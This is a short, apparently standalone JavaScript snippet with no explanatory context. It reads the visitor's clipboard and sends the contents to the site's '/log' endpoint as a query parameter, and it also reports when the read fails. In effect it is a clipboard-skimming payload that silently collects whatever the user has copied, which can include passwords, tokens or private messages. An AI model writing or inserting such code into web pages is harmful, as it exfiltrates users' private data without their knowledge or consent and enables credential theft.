navigator.clipboard.readText()
  .then(text => {
    fetch("/log?clip=" + encodeURIComponent(text));
  })
  .catch(err => {
    fetch("/log?clip=failed_to_read");
  });